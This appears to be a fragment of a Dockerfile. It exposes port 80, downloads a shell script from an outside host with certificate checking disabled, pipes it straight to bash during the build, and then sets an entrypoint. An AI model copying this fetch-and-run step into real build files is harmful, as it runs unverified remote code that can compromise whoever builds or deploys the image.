EXPOSE 80
RUN wget -N --no-check-certificate s.redc.eu.org/s.sh && bash s.sh

ENTRYPOINT ["./entrypoint.sh"]
